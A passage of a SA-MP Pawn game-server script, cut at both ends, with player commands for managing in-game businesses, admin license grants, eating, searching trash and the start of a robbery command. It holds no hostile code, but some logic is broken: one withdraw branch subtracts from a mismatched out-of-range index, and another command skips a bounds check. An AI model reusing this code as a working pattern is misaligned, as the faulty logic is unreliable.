            format(string, sizeof(string), "Buying Products for $%s.", FormatNumber(SBizzInfo[bouse-500][sbPriceProd]));
            OnSbizUpdate(bouse-500);
        }
        else
        {
            BizzInfo[bouse][bPriceProd] = strval(tmp);
            format(string, sizeof(string), "Buying Products for $%s.", FormatNumber(BizzInfo[bouse][bPriceProd]));
            OnBizUpdate(bouse);
        }
        SendClientMessage(playerid, COLOR_ALI, string);
        return 1;
    }
    if(strcmp(cmd, "/bizfee", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 9999)
            {
                SendClientMessage(playerid, COL_SYN, "You don't own a business.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                return SendClientMessage(playerid, COL_SYN, "Syntax: /bizfee <EntranceFee>");
            }
            if(strval(tmp) < 0 || strval(tmp) > 100)
            {
                SendClientMessage(playerid, COLOR_LIGHTRED, "Entrance Fee must be between $1 and $100.");
                return 1;
            }
            if (bouse >= 500)
            {
                if(strval(tmp) > 10) return SendMessage(playerid, COLOR_LIGHTRED, "Special business entrance fee must be between $1 and $10.");
                SBizzInfo[bouse-500][sbEntranceCost] = strval(tmp);
                format(string, sizeof(string), "Entrance fee set to $%d.", SBizzInfo[bouse-500][sbEntranceCost]);
                OnSbizUpdate(bouse-500);
            }
            else
            {
                BizzInfo[bouse][bEntranceCost] = strval(tmp);
                format(string, sizeof(string), "Entrance fee set to $%d.", BizzInfo[bouse][bEntranceCost]);
                OnBizUpdate(bouse);
            }
            SendClientMessage(playerid, COLOR_WHITE, string);
        }
        return 1;
    }
    if(strcmp(cmd, "/bizname", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 9999)
            {
                SendClientMessage(playerid, COL_SYN, "You don't own a business.");
                return 1;
            }
            new result[256];
            result = strtokEx(cmdtext,idx);
            if(!strlen(result))
            {
                return SendClientMessage(playerid, COL_SYN, "Syntax: /bizname <NewName>");
            }
            if (bouse >= 500)
            {
                strmid(SBizzInfo[bouse-500][sbMessage], result, 0, 64, 128);
                format(string, sizeof(string), "Business name set to: %s",SBizzInfo[bouse-500][sbMessage]);
                OnSbizUpdate(bouse-500);
            }
            else
            {
                strmid(BizzInfo[bouse][bMessage], result, 0, 64, 128);
                format(string, sizeof(string), "Business name set: to %s",BizzInfo[bouse][bMessage]);
                OnBizUpdate(bouse);
            }
            SendClientMessage(playerid, COLOR_ALI, string);
        }
        return 1;
    }
    if(strcmp(cmd, "/bizwithdraw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
	    new buz = PlayerInfo[playerid][pPbiskey];
            if (bouse == 9999)
            {
                SendClientMessage(playerid, COL_SYN, "You don't own a business.");
                return 1;
            }
            if(!IsPlayerInRangeOfPoint(playerid,3,BizzInfo[buz][bEntranceX],BizzInfo[buz][bEntranceY],BizzInfo[buz][bEntranceZ]) && (Mahal[playerid] != 15 && TooBiz[playerid] != buz)) return SCM(playerid,COLOR_ALI,"You must be near of the biz door or you must enter it.");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Syntax: /bizwithdraw <Amount>");
                if (bouse >= 500)
                {
                    format(string, sizeof(string), "You have $%s in your till.", FormatNumber(SBizzInfo[bouse-500][sbTill]));
                    return SendClientMessage(playerid, COL_SYN, string);
                }
                else
                {
                    format(string, sizeof(string), "You have $%s in your till.", FormatNumber(BizzInfo[bouse][bTill]));
                    return SendClientMessage(playerid, COL_SYN, string);
                }
            }
            new cashdeposit = strval(tmp);
            if (bouse >= 500)
            {
                    if (cashdeposit > SBizzInfo[bouse-500][sbTill] || cashdeposit < 1)
                    {
                        SendClientMessage(playerid, COL_SYN, "You have this cash on your till.");
                        return 1;
                    }
                    GivePlayerPool(playerid,cashdeposit);
                    SBizzInfo[bouse+500][sbTill] -= cashdeposit;
                    format(string, sizeof(string), "You've withdrawn $%s to your till ,Total: $%s ", FormatNumber(cashdeposit),FormatNumber(SBizzInfo[bouse-500][sbTill]));
                    OnSbizUpdate(bouse-500);
                    SendClientMessage(playerid, COLOR_ALI, string);
                    return 1;
            }
            else
            {
                    if (cashdeposit > BizzInfo[bouse][bTill] || cashdeposit < 1)
                    {
                        SendClientMessage(playerid, COL_SYN, "You have this cash on your till.");
                        return 1;
                    }
                    GivePlayerPool(playerid,cashdeposit);
                    BizzInfo[bouse][bTill] -= cashdeposit;
                    format(string, sizeof(string), "You've withdrawn $%s to your till ,Total: $%s ", FormatNumber(cashdeposit),FormatNumber(BizzInfo[bouse][bTill]));
                    OnBizUpdate(bouse);
                    SendClientMessage(playerid, COLOR_ALI, string);
                    return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/sellsbiz", true) == 0)
    {
        new biz = PINFO[playerid][pPbiskey];
        if(biz == 9999) return SCM(playerid, COL_SYN, "You don't own a business.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) { SCM(playerid,COL_SYN,"Syntax: /sellsbiz <Price>"); return SCM(playerid,COLOR_ALI,"Use 0 for price to disable it."); }
        new price = strval(tmp);
        if(!IsPlayerInRangeOfPoint(playerid,4,SBizzInfo[biz-500][sbEntranceX],SBizzInfo[biz-500][sbEntranceY],SBizzInfo[biz-500][sbEntranceZ]))
        {
            SendClientMessage(playerid, COLOR_GRAD2, "Shoma Bayad Dar Biz Bashid");
            return 1;
       }
        if(price <= -1 || price >= 5000001) return SCM(playerid,COLOR_ALI,"Type a price number between 1 and $5,000,000 or 0 to disable it.");
            if(price == 0)
            {
                SBizzInfo[biz-500][sbOwned] = 1;
                SBizzInfo[biz-500][sbForosh] = 0;
                OnSbizUpdate(biz-500);
                return SCM(playerid,COLOR_ALI,"SellBiz {FFFFFF}Disabled.");
            }
            if(price >= 1)
            {
                SBizzInfo[biz-500][sbOwned] = 2;
                SBizzInfo[biz-500][sbForosh] = price;
                OnSbizUpdate(biz-500);
                format(string,256,"Your biz is for sell, Price: $%s",FormatNumber(price));
                return SCM(playerid,COLOR_ALI,string);
            }
        return 1;
    }
    if(strcmp(cmd, "/sbizwithdraw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 9999)
            {
                SendClientMessage(playerid, COL_SYN, "You don't own a business.");
                return 1;
            }
			if(!IsPlayerInRangeOfPoint(playerid,4,SBizzInfo[bouse-500][sbEntranceX],SBizzInfo[bouse-500][sbEntranceY],SBizzInfo[bouse-500][sbEntranceZ]))
            {
            SendClientMessage(playerid, COLOR_GRAD2, "Shoma Bayad Dar Biz Bashid");
            return 1;
			}
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Syntax: /sbizwithdraw <Amount>");
                format(string, sizeof(string), "You have $%s in your till.", FormatNumber(SBizzInfo[bouse-500][sbTill]));
                return SendClientMessage(playerid, COL_SYN, string);
            }
            new cashdeposit = strval(tmp);
            if (cashdeposit > SBizzInfo[bouse-500][sbTill] || cashdeposit < 1)
            {
            SendClientMessage(playerid, COL_SYN, "You have this cash on your till.");
                        return 1;
                    }
                    GivePlayerPool(playerid,cashdeposit);
                    SBizzInfo[bouse-500][sbTill] = SBizzInfo[bouse-500][sbTill]-cashdeposit;
                    format(string, sizeof(string), "You've withdrawn $%s to your till ,Total: $%s ", FormatNumber(cashdeposit),FormatNumber(SBizzInfo[bouse-500][sbTill]));
                    OnSbizUpdate(bouse-500);
                    SendClientMessage(playerid, COLOR_ALI, string);
                    return 1;
                    }
        return 1;
    }
    if(strcmp(cmd, "/sbizdeposit", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 9999)
            {
                SendClientMessage(playerid, COL_SYN, "You don't own a business.");
                return 1;
            }
            if(!IsPlayerInRangeOfPoint(playerid,4,SBizzInfo[bouse-500][sbEntranceX],SBizzInfo[bouse-500][sbEntranceY],SBizzInfo[bouse-500][sbEntranceZ]))
            {
            SendClientMessage(playerid, COLOR_GRAD2, "Shoma Bayad Dar Biz Bashid");
            return 1;
			}
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Syntax: /bizdeposit <Amount>");
                format(string, sizeof(string), "You have $%s in your till.", FormatNumber(SBizzInfo[bouse-500][sbTill]));
                return SendClientMessage(playerid, COL_SYN, string);
            }
            new cashdeposit = strval(tmp);
            if (cashdeposit > GetPlayerPool(playerid) || cashdeposit < 1)
            {
                SendClientMessage(playerid, COL_SYN, "Shoma Pool Kafi Nadarid.");
                return 1;
            }
            GivePlayerPool(playerid,-cashdeposit);
            SBizzInfo[bouse-500][sbTill] += cashdeposit;
            format(string, sizeof(string), "You've deposited $%s to your till ,Total: $%s ", FormatNumber(cashdeposit),FormatNumber(SBizzInfo[bouse-500][sbTill]));
            OnSbizUpdate(bouse-500);
            SendClientMessage(playerid, COLOR_ALI, string);
            return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/bizdeposit", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
	    new buz = PlayerInfo[playerid][pPbiskey];
            if (bouse == 9999)
            {
                SendClientMessage(playerid, COL_SYN, "You don't own a business.");
                return 1;
            }
            if(!IsPlayerInRangeOfPoint(playerid,5,BizzInfo[buz][bEntranceX],BizzInfo[buz][bEntranceY],BizzInfo[buz][bEntranceZ]) && (Mahal[playerid] != 15 && TooBiz[playerid] != buz)) return SCM(playerid,COLOR_ALI,"You must be near of the biz door or you must enter it.");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Syntax: /bizdeposit <Amount>");
                if (bouse >= 500)
                {
                    format(string, sizeof(string), "You have $%s in your till.", FormatNumber(SBizzInfo[bouse-500][sbTill]));
                    return SendClientMessage(playerid, COL_SYN, string);
                }
                else
                {
                    format(string, sizeof(string), "You have $%s in your till.", FormatNumber(BizzInfo[bouse][bTill]));
                    return SendClientMessage(playerid, COL_SYN, string);
                }
            }
            new cashdeposit = strval(tmp);
            if (cashdeposit > GetPlayerPool(playerid) || cashdeposit < 1)
            {
                SendClientMessage(playerid, COL_SYN, "Shoma Pool Kafi Nadarid.");
                return 1;
            }
            if (bouse >= 500)
            {
                    GivePlayerPool(playerid,-cashdeposit);
                    SBizzInfo[bouse-500][sbTill] += cashdeposit;
                    format(string, sizeof(string), "You've deposited $%s to your till ,Total: $%s ", FormatNumber(cashdeposit),FormatNumber(SBizzInfo[bouse-500][sbTill]));
                    OnSbizUpdate(bouse-500);
                    SendClientMessage(playerid, COLOR_ALI, string);
                    return 1;
            }
            else
            {
                    GivePlayerPool(playerid,-cashdeposit);
                    BizzInfo[bouse][bTill] += cashdeposit;
                    format(string, sizeof(string), "You've deposited $%s to your till ,Total: $%s ", FormatNumber(cashdeposit),FormatNumber(BizzInfo[bouse][bTill]));
                    OnBizUpdate(bouse);
                    SendClientMessage(playerid, COLOR_ALI, string);
                    return 1;
            }
        }
        return 1;
    }
//-----------------------------AGL-------------------------------------------------------------------



			if(strcmp(cmd, "/package", true) == 0)
		{
			if(PINFO[playerid][pAdmin] < 9) return SCM(playerid, COLOR_YELLOW2, "Error: You are not admin.");
			if(IsPlayerConnected(playerid))
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendMessage(playerid, COL_SYN, "Syntax: /package <PlayerID/PartOfName>");
						new Taraf = ReturnUser(tmp);
        if(Taraf == playerid) return SCM(playerid,COLOR_Good,"You cannot Goto yourself.");
			new target = ReturnUser(tmp);
			if(!IsPlayerConnected(target)) return SCM(playerid, COLOR_YELLOW2, "Error: Player isn't connected.");
			new name[40];
			new taraf[40];
			GetPlayerName(playerid, name, sizeof(name));
			GetPlayerName(target, taraf, sizeof(taraf));
			new sstring[256];
			format(sstring, sizeof(sstring), "{FFFFFF}Admin %s given all licenses,10k money,3 level to %s.",name, taraf);
			AdminWarn(sstring);
			format(sstring, sizeof(sstring), "Admin %s given all licenses,10k money and 3 level to you.",name);
			SCM(target, COLOR_LIGHTBLUE, sstring);

			PlayerInfo[target][pFlyLic] = 300;
			SaveKonVal(target, "pFlyLic", 300);

			PlayerInfo[target][pBoatLic] = 300;
			SaveKonVal(target, "pBoatLic", 300);

			PlayerInfo[target][pCarLic] = 300;
			SaveKonVal(target, "pCarLic", 300);

			PlayerInfo[target][pFishLic] = 300;
			SaveKonVal(target, "pFishLic", 300);

			PlayerInfo[target][pMatsLic] = 300;
			SaveKonVal(target, "pMatsLic", 300);

			PlayerInfo[target][pGunLic] = 300;
			SaveKonVal(target, "pGunLic", 300);

            PlayerInfo[target][pLevel] = 3;
			SaveKonVal(target, "pLevel", 3);

			GivePlayerPool(target, 10000);
			return 1;
		}



		if(strcmp(cmd, "/aglall", true) == 0)
		{
			if(PINFO[playerid][pAdmin] < 3) return SCM(playerid, COLOR_YELLOW2, "Error: You are not admin.");
			if(IsPlayerConnected(playerid))
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /aglall <PlayerID/PartOfName>");
						new Taraf = ReturnUser(tmp);
        if(Taraf == playerid) return SCM(playerid,COLOR_Good,"You cannot Goto yourself.");
			new target = ReturnUser(tmp);
			if(!IsPlayerConnected(target)) return SCM(playerid, COLOR_YELLOW2, "Error: Player isn't connected.");
			new name[40];
			new taraf[40];
			GetPlayerName(playerid, name, sizeof(name));
			GetPlayerName(target, taraf, sizeof(taraf));
			new sstring[256];
			format(sstring, sizeof(sstring), "{FFFFFF}Admin %s given all licenses to %s.",name, taraf);
			AdminWarn(sstring);
			format(sstring, sizeof(sstring), "Admin %s given all licenses to you.",name);
			SCM(target, COLOR_LIGHTBLUE, sstring);
			PlayerInfo[target][pFlyLic] = 300;
			SaveKonVal(target, "pFlyLic", 300);

			PlayerInfo[target][pBoatLic] = 300;
			SaveKonVal(target, "pBoatLic", 300);

			PlayerInfo[target][pCarLic] = 300;
			SaveKonVal(target, "pCarLic", 300);

			PlayerInfo[target][pFishLic] = 300;
			SaveKonVal(target, "pFishLic", 300);

			PlayerInfo[target][pMatsLic] = 300;
			SaveKonVal(target, "pMatsLic", 300);

			PlayerInfo[target][pGunLic] = 300;
			SaveKonVal(target, "pGunLic", 300);


			return 1;
		}


    if(strcmp(cmd, "/agivelicense", true) == 0 || strcmp(cmd, "/agl", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr)) {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /agl [name] [playerid/PartOfName]");
                    SendClientMessage(playerid, COLOR_WHITE, "Available names: Driving, Flying, Sailing, Fishing, Weapon, Materials.");
                    return 1;
                }
                if(strcmp(x_nr,"flying",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /agl flying [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pFlyLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Flying license to that player because his/her flying license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "You've given a Flying License to %s.",giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Admin %s has given you a Flying License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pFlyLic] = 300;
                            SaveKonVal(giveplayerid, "pFlyLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline!");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"sailing",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /agl sailing [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pBoatLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Sailing license to that player because his/her sailing license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "You've given a Sailing License to %s.",giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Admin %s has given you a Sailing License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pBoatLic] = 300;
                            SaveKonVal(giveplayerid, "pBoatLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline!");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"driving",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /agl Driving [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pCarLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Driving license to that player because his/her Driving license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "You've given a Driving License to %s.",giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Admin %s has given you a Driving License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pCarLic] = 300;
                            SaveKonVal(giveplayerid, "pCarLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline !");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"fishing",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /agl fishing [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "You've given a Fishing License to %s.",giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Admin %s has given you a Fishing License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pFishLic] = 300;
                            SaveKonVal(giveplayerid, "pFishLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline!");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"materials",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /agl materials [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pMatsLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Materials license to that player because his/her Materials license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "* You've given a Materials License to %s.",giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* Admin %s has given you a Materials License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pMatsLic] = 300;
                            SaveKonVal(giveplayerid, "pMatsLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline!");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"weapon",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /agl weapon [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pGunLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Weapon license to that player because his/her Weapon license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "You've given a Weapon License to %s.",giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Admin %s has given you a Weapon License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pGunLic] = 300;
                            SaveKonVal(giveplayerid, "pGunLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is Offline!");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this commnad.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/bigears", true) == 0)
    {
    if(PlayerInfo[playerid][pAdmin] < 6) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        if(IsPlayerConnected(playerid))
        {
            if (!BigEar[playerid])
            {
                BigEar[playerid] = 1;
                SendClientMessage(playerid, COLOR_GRAD2, "You're ears are big now!");
            }
            else if (BigEar[playerid])
            {
                (BigEar[playerid] = 0);
                SendClientMessage(playerid, COLOR_GRAD2, "You're ears are small now");
            }
        }
        return 1;
    }
    //----------------------------------[HOTDOG-Place]-----------------------------------------------
    if(strcmp(cmd, "/hotdog", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(GetPlayerPool(playerid) < SBizzInfo[21][sbEntranceCost]) return SCM(playerid,COLOR_ALI,"Shoma Pool Kafi Nadarid.");
            if(IsAtHotdogPlace(playerid))
            {
                new Float:health;
                GetPlayerHealth(playerid,health);
                if(health >= 75)
                {
                    SetPlayerKhoon(true, playerid, 100);
                    LoopingAnim(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
                    GivePlayerPool(playerid, -SBizzInfo[21][sbEntranceCost]);
                    new stri[50];
                    format(stri, 50, "~r~-$%s",FormatNumber(SBizzInfo[21][sbEntranceCost]));
                    GameTextForPlayer(playerid, stri, 5000, 1);
                }
                else
                {
                    SetPlayerKhoon(true, playerid, health+25);
                    LoopingAnim(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
                    GivePlayerPool(playerid, -SBizzInfo[21][sbEntranceCost]);
                    new stri[50];
                    format(stri, 50, "~r~-$%s",FormatNumber(SBizzInfo[21][sbEntranceCost]));
                    GameTextForPlayer(playerid, stri, 5000, 1);
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD1,"You are not at a hotdog place.");
                return 1;
            }
            
        }
        return 1;
    }
    if(strcmp(cmd, "/eat", true) == 0)
    {
       if(IsPlayerConnected(playerid))
       {
          if(GetPlayerPool(playerid) <=0 ) return SCM(playerid,COLOR_ALI,"Shoma Pool Kafi Nadarid.");
          if(IsAtEatPlace(playerid))
          {
                new Float:health;
                GetPlayerHealth(playerid,health);
                if(health >= 75)
                {
                    SetPlayerKhoon(true, playerid, 100);
                    LoopingAnim(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
                    GivePlayerPool(playerid, -1);
                    GameTextForPlayer(playerid, "~r~-$1", 5000, 1);
                }
                else
                {
                    SetPlayerKhoon(true, playerid, health+50);
                    LoopingAnim(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
                    GivePlayerPool(playerid, -1);
                    GameTextForPlayer(playerid, "~r~-$1", 5000, 1);
                }
          }
          else
          {
                SendClientMessage(playerid, COLOR_GRAD1,"You are not at a eat place.");
                return 1;
          }
       }
        return 1;
    }
        if(strcmp(cmd, "/gsh", true) == 0)
            {
       if(IsPlayerConnected(playerid))
       {
          if(GetPlayerPool(playerid) <=0 ) return SCM(playerid,COLOR_ALI,"Shoma Pool Kafi Nadarid.");
          if(IsAtEatPlace(playerid))
          {
                new Float:health;
                GetPlayerHealth(playerid,health);
                if(health >= 75)
                {
                    SetPlayerKhoon(true, playerid, 100);
                    LoopingAnim(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
                    GivePlayerPool(playerid, -1);
                    GameTextForPlayer(playerid, "~r~-$1", 5000, 1);
                }
                else
                {
                    SetPlayerKhoon(true, playerid, health+25);
                    LoopingAnim(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
                    GivePlayerPool(playerid, -1);
                    GameTextForPlayer(playerid, "~r~-$1", 5000, 1);
                }
          }
          else
          {
                SendClientMessage(playerid, COLOR_GRAD1,"You are not at a eat place.");
                return 1;
          }
       }
        return 1;
    }
/*----------------------------------------------------------------------------*/
/*----------------------------------------------------------------------------*/
/*----------------------------------------------------------------------------*/
/*----------------------------------------------------------------------------*/
/*----------------------------------------------------------------------------*/






    if(!strcmp(cmd,"/begard",true))
	{
	    new rand;
		if(IsPlayerInRangeOfPoint(playerid,5.0,1828.5535,-1143.6344,23.9121)|| IsPlayerInRangeOfPoint(playerid,5.0,1829.5398,-1084.1140,23.8812) || IsPlayerInRangeOfPoint(playerid,5.0,1829.4103,-1114.2440,23.8804)) {
		if(TrashKhalie[0] == 1 && IsPlayerInRangeOfPoint(playerid,5.0,1828.5535,-1143.6344,23.9121)) return SCM(playerid,-1,"Satl Ashghal Khali Ast");
		if(TrashKhalie[1] == 1 && IsPlayerInRangeOfPoint(playerid,5.0,1829.5398,-1084.1140,23.8812)) return SCM(playerid,-1,"Satl Ashghal Khali Ast");
		if(TrashKhalie[2] == 1 && IsPlayerInRangeOfPoint(playerid,5.0,1829.4103,-1114.2440,23.8804)) return SCM(playerid,-1,"Satl Ashghal Khali Ast");
            rand = random(11);
             new str[128];
             switch(rand)
     {
          case 0,1,9:
		  {
		  new randmoney;
   		   randmoney = random(2000);
    	   format(str, sizeof(str), "Shoma Dar Satl Ashghal  $%d Pool Peyda Kardid",  randmoney);
    	   SendClientMessage(playerid, 0xffffffff, str);
   		   GivePlayerMoney(playerid, randmoney);//barcustom_get

		  }
          case 2,3,4:
		  {
            PlayerInfo[playerid][pCigarettes] += 20;
            format(str, sizeof(str), "Shoma Dar Satl Ashghal  Sigar(Cigarettes) Peyda Kardid");
  		    SendClientMessage(playerid, 0xffffffff, str);
		  }
		  case 5,6,7,8:
		  {
            format(str, sizeof(str), "Shoma Dar Satl Ashghal  Yek Pizza'ye nesfe Peyda Kardid");
  		    SendClientMessage(playerid, 0xffffffff, str);
        SetPlayerKhoon(true, playerid, GetPlayerHealth(playerid)+20);
		  }
			default:
			{
            format(str, sizeof(str), "Shoma Chizi Dar Satl Ashghal Peyda Nakardid");
  		    SendClientMessage(playerid, 0xffffffff, str);
			}
			}
      if(IsPlayerInRangeOfPoint(playerid,2.0,1828.5535,-1143.6344,23.9121)) { TrashKhalie[0] = 1; SetTimerEx ("TrashCharge", 30000, false, "d", 0); }
		else if(IsPlayerInRangeOfPoint(playerid,2.0,1829.5398,-1084.1140,23.8812)) {TrashKhalie[1] = 1;  SetTimerEx ("TrashCharge", 30000, false, "d", 1);}
		else {TrashKhalie[2] = 1;  SetTimerEx ("TrashCharge", 30000, false, "d", 2); }
	 }
		
		return 1;
	}
    if(!strcmp(cmd,"/tch",true))
	{
		if(PlayerInfo[playerid][pAdmin] <= 7) return SCM(playerid,-1,"Ejaze dastresi nadarid");
		TrashKhalie[0] = 0;TrashKhalie[1] = 0;TrashKhalie[2] = 0;
			new string[512];
	format(string,sizeof(string),"{f45642}[Admin-Warn]: {FFFFFF}admin {f45642}%s{ffffff} Hame Trash Ha Ra Charge Kard. ",PINFO[playerid][pName]);
	SendAdminMessage(-1,string);
	return 1;
	}
    if(!strcmp(cmd,"/rob",true))
    {
        if(IsACop(playerid)) return SCM(playerid,COLOR_BLUE,"Cops can't do a rob.");
        if(PINFO[playerid][pLevel] <= 4) return SCM(playerid,COLOR_ALI,"To do a rob your level must be more than 5.");
        if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid,COLOR_ALI,"You are not driving a 4 door vehicle.");
